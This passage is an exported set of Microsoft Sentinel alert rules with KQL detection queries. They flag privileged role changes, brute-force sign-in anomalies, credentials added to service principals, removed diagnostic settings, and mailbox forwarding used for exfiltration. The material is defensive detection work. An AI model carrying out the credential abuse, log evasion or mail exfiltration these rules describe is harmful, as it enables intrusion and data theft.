TargetUserPrincipalName = tostring(TargetResource.userPrincipalName)\n    )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend\n    TargetName = tostring(split(TargetUserPrincipalName, '@', 0)[0]),\n    TargetUPNSuffix = tostring(split(TargetUserPrincipalName, '@', 1)[0])\n| extend\n    InitiatedByName = tostring(split(InitiatingUserPrincipalName, '@', 0)[0]),\n    InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName, '@', 1)[0])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatedByName"},{"identifier":"UPNSuffix","columnName":"InitiatedByUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.0.5","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Privileged Role Assigned Outside PIM","enabled":true,"description":"Identifies a privileged role being assigned to a user outside of PIM\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor-1\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1078;T1078.004","alertRuleTemplateName":"269435e3-1db8-4423-9dfc-9bf59997da1c","lastModifiedUtc":"2024-10-02T21:16:49.5480017Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/3b21a63f-154c-4192-83b2-93313034cd38","name":"3b21a63f-154c-4192-83b2-93313034cd38","etag":"\"1b0060f5-0000-2700-0000-66d8aa360000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let LookBack = 1h;\nlet Data = (\nSigninLogs\n| where TimeGenerated >= ago(LookBack)\n| where parse_json(NetworkLocationDetails)[0].networkType != \"trustedNamedLocation\" // Excludes known tagged networks\n// Counts the number of sign in events in the last hour every 15 minutes by IP\n| make-series EventCounts = count() on TimeGenerated from ago(LookBack) to now() step 15m by IPAddress \n);\nlet AnomalyAlert = (\nData\n| extend (Anomalies, Score, Baseline) = series_decompose_anomalies(EventCounts,1.5,-1,'linefit')\n| mv-expand EventCounts,TimeGenerated,Anomalies to typeof(double),Baseline to typeof(long),Score to typeof(double)\n| where Anomalies > 0\n);\nAnomalyAlert\n| join kind = inner (SigninLogs\n| where TimeGenerated between (ago(LookBack) .. now())\n| where parse_json(NetworkLocationDetails)[0].networkType != \"trustedNamedLocation\"\n| extend PasswordResult = tostring(parse_json(AuthenticationDetails).authenticationStepResultDetail)\n| summarize UserCount = dcount(UserPrincipalName), UserList = make_set(UserPrincipalName), AppName = make_set(AppDisplayName), PasswordResult = make_list(PasswordResult) by IPAddress) on IPAddress\n| where PasswordResult has \"Correct Password\"\n| where UserCount > 1 // looks for events targeting more than one user.","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"Score":"Score","Baseline":"Baseline","UserCount":"UserCount","AppName":"AppName","PasswordResult":"PasswordResult","UserList":"UserList"},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Anomalies"}]}],"templateVersion":"1.0.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":["T1110"],"displayName":"Anomaly Sign In Event from an IP","enabled":true,"description":"Identifies sign-in anomalies from an IP in the last hour, targeting multiple users where the password is correct after multiple attempts\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows;MITRE:TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":"9c1e9381-79dd-4ddf-9570-b73a1dc59fe0","lastModifiedUtc":"2024-09-04T18:43:01.6404412Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4fb4fe92-119c-4364-b270-055b11f2a8da","name":"4fb4fe92-119c-4364-b270-055b11f2a8da","etag":"\"8d01e2af-0000-2700-0000-670e7dfc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let query_frequency = 1h;\nlet query_period = 1d;\nAuditLogs\n| where TimeGenerated > ago(query_frequency)\n| where Category =~ \"UserManagement\" and OperationName =~ \"Delete user\"\n| mv-expand TargetResource = TargetResources\n| where TargetResource[\"type\"] == \"User\" and TargetResource[\"userPrincipalName\"] has \"#EXT#\"\n| extend ParsedDeletedUserPrincipalName = extract(@\"^[0-9a-f]{32}([^\\#]+)\\#EXT\\#\", 1, tostring(TargetResource[\"userPrincipalName\"]))\n| extend\n    Initiator = iif(isnotempty(InitiatedBy[\"app\"]), tostring(InitiatedBy[\"app\"][\"displayName\"]), tostring(InitiatedBy[\"user\"][\"userPrincipalName\"])),\n    InitiatorId = iif(isnotempty(InitiatedBy[\"app\"]), tostring(InitiatedBy[\"app\"][\"servicePrincipalId\"]), tostring(InitiatedBy[\"user\"][\"id\"])),\n    Delete_IPAddress = tostring(InitiatedBy[tostring(bag_keys(InitiatedBy)[0])][\"ipAddress\"])\n| project Delete_TimeGenerated = TimeGenerated, Category, Identity, Initiator, Delete_IPAddress, OperationName, Result, ParsedDeletedUserPrincipalName, InitiatedBy, AdditionalDetails, TargetResources, InitiatorId, CorrelationId\n| join kind=inner (\n    SigninLogs\n    | where TimeGenerated > ago(query_period)\n    | summarize take_any(*) by UserPrincipalName\n    | extend ParsedUserPrincipalName = translate(\"@\", \"_\", UserPrincipalName)\n    | project SigninLogs_TimeGenerated = TimeGenerated, UserPrincipalName, UserDisplayName, ResultType, ResultDescription, IPAddress, LocationDetails, AppDisplayName, ResourceDisplayName, ClientAppUsed, UserAgent, DeviceDetail, UserId, UserType, OriginalRequestId, ParsedUserPrincipalName\n    ) on $left.ParsedDeletedUserPrincipalName == $right.ParsedUserPrincipalName\n| where Delete_TimeGenerated > SigninLogs_TimeGenerated\n| project-away ParsedDeletedUserPrincipalName, ParsedUserPrincipalName\n| extend\n    AccountName = tostring(split(UserPrincipalName, \"@\")[0]),\n    AccountUPNSuffix = tostring(split(UserPrincipalName, \"@\")[1])","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"AccountName"},{"identifier":"UPNSuffix","columnName":"AccountUPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Suspicious Login Before Account Deletion","enabled":true,"description":"This query will detect logins to guest account which were recently deleted. \nFor any successful logins from deleted identities should be investigated further if any existing user accounts have been altered or linked to such identity prior deletion\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078;T1078.004","alertRuleTemplateName":"defe4855-0d33-4362-9557-009237623976","lastModifiedUtc":"2024-10-15T14:36:41.96054Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8c2ab13d-e158-458d-b6e4-67d0a9cef84f","name":"8c2ab13d-e158-458d-b6e4-67d0a9cef84f","etag":"\"8600fcde-0000-2700-0000-66fdb9b50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceFileEvents\n  | where ActionType =~ \"FileCreated\"\n  | where FolderPath has \"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\" \n  | where FileName endswith \".exe\" or FileName endswith \".dll\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1203"],"displayName":"PE file dropped in Color Profile Folder","enabled":true,"description":"This query looks for writes of PE files to C:\\Windows\\System32\\spool\\drivers\\color\\.\n  This is a common directory used by malware, as well as some legitimate programs, and writes of PE files to the folder should be monitored.\n  Ref: https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0005;T1562;T1562.008","alertRuleTemplateName":"f68a5046-b7eb-4f69-9519-1e99708bb9e0","lastModifiedUtc":"2024-10-02T21:22:59.3704814Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4d688f6a-ed4e-41d1-b2c0-2b11cd744cdc","name":"4d688f6a-ed4e-41d1-b2c0-2b11cd744cdc","etag":"\"8700e60a-0000-2700-0000-66fdbc8e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"NRT","properties":{"severity":"Medium","query":"AuditLogs\n| where OperationName has_any (\"Add service principal\", \"Certificates and secrets management\")\n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| mv-apply TargetResource = TargetResources on \n  (\n    where TargetResource.type =~ \"Application\"\n    | extend targetDisplayName = tostring(TargetResource.displayName),\n             targetId = tostring(TargetResource.id),\n             targetType = tostring(TargetResource.type),\n             keyEvents = TargetResource.modifiedProperties\n  )\n|  mv-apply Property = keyEvents on \n (\n  where Property.displayName =~ \"KeyDescription\"\n  | extend new_value_set = parse_json(tostring(Property.newValue)),\n           old_value_set = parse_json(tostring(Property.oldValue))\n )\n| where old_value_set == \"[]\"\n| mv-expand new_value_set\n| parse new_value_set with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *\n| where keyUsage == \"Verify\"\n | mv-apply AdditionalDetail = AdditionalDetails on \n  (\n    where AdditionalDetail.key =~ \"User-Agent\"\n    | extend UserAgent = tostring(AdditionalDetail.value)\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n//| where targetType =~ \"Application\" // or targetType =~ \"ServicePrincipal\"\n| project-away new_value_set, old_value_set\n| project-reorder TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, UserAgent, targetDisplayName, targetId, targetType, keyDisplayName, keyType, keyUsage, keyIdentifier, CorrelationId, TenantId\n| extend InitiatedByName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatedByName"},{"identifier":"UPNSuffix","columnName":"InitiatedByUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.0.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1550"],"displayName":"NRT First access credential added to Application or Service Principal where no credential was present","enabled":true,"description":"This will alert when an admin or app owner account adds a new credential to an Application or Service Principal where there was no previous verify KeyCredential associated.\nIf a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\nAdditional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0004;T1078;T1078.004,TA0005;T1556;T1556.006;T1556.007,TA0006;T1552","alertRuleTemplateName":"b6988c32-4f3b-4a45-8313-b46b33061a74","lastModifiedUtc":"2024-10-02T21:35:06.9933589Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/68954fe3-312d-4129-8520-7939b5ac1866","name":"68954fe3-312d-4129-8520-7939b5ac1866","etag":"\"88001c15-0000-2700-0000-66fdce150000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT2H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AzureActivity\n| where OperationNameValue =~ \"MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE\"\n| summarize\n    TimeGenerated = arg_max(TimeGenerated, Properties),\n    ActivityStatusValue = make_set(ActivityStatusValue, 5),\n    take_any(Caller, CallerIpAddress, OperationName, ResourceGroup, Resource)\n    by CorrelationId, _ResourceId, OperationNameValue\n| extend ResourceHierarchy = split(_ResourceId, \"/\")\n| extend MonitoredResourcePath = strcat_array(array_slice(ResourceHierarchy, 0, array_length(ResourceHierarchy)-5), \"/\")\n| join kind=leftanti (\n    AzureActivity\n    | where OperationNameValue !~ \"MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE\" and OperationNameValue endswith \"/DELETE\" and ActivityStatusValue has_any (\"Success\", \"Succeeded\")\n    | project _ResourceId\n) on $left.MonitoredResourcePath == $right._ResourceId\n| extend\n    Name = iif(Caller has \"@\", tostring(split(Caller, \"@\")[0]), \"\"),\n    UPNSuffix = iif(Caller has \"@\", tostring(split(Caller, \"@\")[1]), \"\"),\n    AadUserId = iif(Caller has \"@\", \"\", Caller)\n| project TimeGenerated, Caller, CallerIpAddress, OperationNameValue, OperationName, ActivityStatusValue, ResourceGroup, MonitoredResourcePath, Resource, Properties, Name, UPNSuffix, AadUserId, _ResourceId, CorrelationId","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"},{"identifier":"AadUserId","columnName":"AadUserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"Azure Diagnostic settings removed from a resource","enabled":true,"description":"This query looks for diagnostic settings that are removed from a resource.\nThis could indicate an attacker or malicious internal trying to evade detection before malicious act is performed.\nIf the diagnostic settings are being deleted as part of a parent resource deletion, the event is ignores.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004,TA0004;T1078;T1078.004","alertRuleTemplateName":"6e95aef3-a1e0-4063-8e74-cd59aa59f245","lastModifiedUtc":"2024-10-02T22:49:57.1585957Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/54b6cabc-8eb2-48ce-b6ff-83629052fae3","name":"54b6cabc-8eb2-48ce-b6ff-83629052fae3","etag":"\"850034bf-0000-2700-0000-66fdaac10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Define the start and end times based on input values\nlet starttime = now()-1h;\nlet endtime = now();\n// Set a lookback period of 14 days\nlet lookback = starttime - 14d;\n// Define a reusable function to query audit logs\nlet awsFunc = (start:datetime, end:datetime) {\n  AuditLogs\n  | where TimeGenerated between (start..end)\n  | where Category =~ \"RoleManagement\"\n  | where AADOperationType in (\"Assign\", \"AssignEligibleRole\")\n  | where ActivityDisplayName has_any (\"Add eligible member to role\", \"Add member to role\")\n  | mv-apply TargetResource = TargetResources on\n    (\n      where TargetResource.type in~ (\"User\", \"ServicePrincipal\")\n      | extend Target = iff(TargetResource.type =~ \"ServicePrincipal\", tostring(TargetResource.displayName), tostring(TargetResource.userPrincipalName)),\n      props = TargetResource.modifiedProperties\n    )\n  | mv-apply Property = props on\n    (\n      where Property.displayName =~ \"Role.DisplayName\"\n      | extend RoleName = trim('\"', tostring(Property.newValue))\n    )\n  | where RoleName contains \"Admin\" and Result == \"success\"\n};\n// Query for audit events in the current day\nlet EventInfo_CurrentDay = awsFunc(starttime, endtime);\n// Query for audit events in the historical period (lookback)\nlet EventInfo_historical = awsFunc(lookback, starttime);\n// Find unseen events by performing a left anti-join\nlet EventInfo_Unseen = (EventInfo_CurrentDay\n  | join kind=leftanti(EventInfo_historical) on Target, RoleName, OperationName\n);\n// Extend and clean up the results\nEventInfo_Unseen\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend Initiator = iif(isnotempty(InitiatingAppName), InitiatingAppName, InitiatingUserPrincipalName)\n// You can uncomment the lines below to filter out PIM activations\n// | where Initiator != \"MS-PIM\"\n// | summarize StartTime=min(TimeGenerated), EndTime=min(TimeGenerated) by OperationName, RoleName, Target, Initiator, Result\n// Project specific columns and split them for further analysis\n| project TimeGenerated, OperationName, RoleName, Target, Initiator, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, Result\n| extend TargetName = tostring(split(Target,'@',0)[0]), TargetUPNSuffix = tostring(split(Target,'@',1)[0]), InitiatorName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatorUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Target"},{"identifier":"Name","columnName":"TargetName"},{"identifier":"UPNSuffix","columnName":"TargetUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatorName"},{"identifier":"UPNSuffix","columnName":"InitiatorUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"templateVersion":"1.1.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1078"],"displayName":"New User Assigned to Privileged Role","enabled":true,"description":"Identifies when a privileged role is assigned to a new user. Any account eligible for a role is now being given privileged access. If the assignment is unexpected or into a role that isn't the responsibility of the account holder, investigate.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0003;T1078;T1078.004;T1098;T1098.003,TA0004;T1078;T1078.004;T1098;T1098.003,TA0005;T1078;T1078.004","alertRuleTemplateName":"050b9b3d-53d0-4364-a3da-1b678b8211ec","lastModifiedUtc":"2024-10-02T20:19:10.497712Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/15ac60b4-44dd-4a9a-9428-deb63d098eb7","name":"15ac60b4-44dd-4a9a-9428-deb63d098eb7","etag":"\"8700b053-0000-2700-0000-66fdc1480000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AuditLogs\n  | where OperationName has \"Consent to application\"\n  | where Result =~ \"failure\"\n  | extend ipAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend userAgent = iif(AdditionalDetails[0].key == \"User-Agent\", tostring(AdditionalDetails[0].value), tostring(AdditionalDetails[1].value))\n  | where isnotempty(TargetResources)\n  | extend AppName = tostring(TargetResources[0].displayName)\n  | mv-expand TargetResources[0].modifiedProperties\n  | extend TargetResources_0_modifiedProperties = columnifexists(\"TargetResources_0_modifiedProperties\", '')\n  | where isnotempty(TargetResources_0_modifiedProperties)\n  | where TargetResources_0_modifiedProperties.displayName =~ \"MethodExecutionResult.\"\n  | extend FailureReason = tostring(parse_json(tostring(TargetResources_0_modifiedProperties.newValue)))\n  | where FailureReason contains \"Risky\"\n  | project-reorder TimeGenerated, OperationName, Result, AppName, FailureReason, userPrincipalName, userAgent, ipAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ipAddress"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"userPrincipalName"}]}],"templateVersion":"1.0.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation"],"techniques":["T1078"],"displayName":"End-user consent stopped due to risk-based consent","enabled":true,"description":"Detects a user's consent to an OAuth application being blocked due to it being too risky.\n  These events should be investigated to understand why the user attempted to consent to the applicaiton and what other applicaitons they may have consented to.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-applications#end-user-stopped-due-to-risk-based-consent\nPLATFORM:Azure AD,IaaS,Microsoft 365\nMITRE:TA0003;T1098;T1098.001;T1098.003,TA0040;T1499;T1499.004","alertRuleTemplateName":"009b9bae-23dd-43c4-bcb9-11c4ba7c784a","lastModifiedUtc":"2024-10-02T21:55:19.8887087Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/ec715e8b-ca5b-4fbd-b68f-2db8996f6bd8","name":"ec715e8b-ca5b-4fbd-b68f-2db8996f6bd8","etag":"\"8700fd05-0000-2700-0000-66fdbc3e0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"NRT","properties":{"severity":"Medium","query":"OfficeActivity\n| where OfficeWorkload =~ \"Exchange\"\n| where Parameters has_any (\"ForwardTo\", \"RedirectTo\", \"ForwardingSmtpAddress\")\n| mv-apply DynamicParameters = todynamic(Parameters) on (summarize ParsedParameters = make_bag(pack(tostring(DynamicParameters.Name), DynamicParameters.Value)))\n| evaluate bag_unpack(ParsedParameters, columnsConflict='replace_source')\n| extend DestinationMailAddress = tolower(case(\n    isnotempty(column_ifexists(\"ForwardTo\", \"\")), column_ifexists(\"ForwardTo\", \"\"),\n    isnotempty(column_ifexists(\"RedirectTo\", \"\")), column_ifexists(\"RedirectTo\", \"\"),\n    isnotempty(column_ifexists(\"ForwardingSmtpAddress\", \"\")), trim_start(@\"smtp:\", column_ifexists(\"ForwardingSmtpAddress\", \"\")),\n    \"\"))\n| where isnotempty(DestinationMailAddress)\n| mv-expand split(DestinationMailAddress, \";\")\n| extend ClientIPValues = extract_all(@'\\[?(::ffff:)?(?P<IPAddress>(\\d+\\.\\d+\\.\\d+\\.\\d+)|[^\\]]+)\\]?([-:](?P<Port>\\d+))?', dynamic([\"IPAddress\", \"Port\"]), ClientIP)[0]\n| extend ClientIP = tostring(ClientIPValues[0]), Port = tostring(ClientIPValues[1])\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), DistinctUserCount = dcount(UserId), UserId = make_set(UserId, 250), Ports = make_set(Port, 250), EventCount = count() by tostring(DestinationMailAddress), ClientIP\n| where DistinctUserCount > 1\n| mv-expand UserId to typeof(string)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"templateVersion":"1.0.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection","Exfiltration"],"techniques":["T1114","T1020"],"displayName":"NRT Multiple users email forwarded to same destination","enabled":true,"description":"Identifies when multiple (more than one) users mailboxes are configured to forward to the same destination.\nThis could be an attacker-controlled destination mailbox configured to collect mail from multiple compromised user accounts.\nPLATFORM:Microsoft 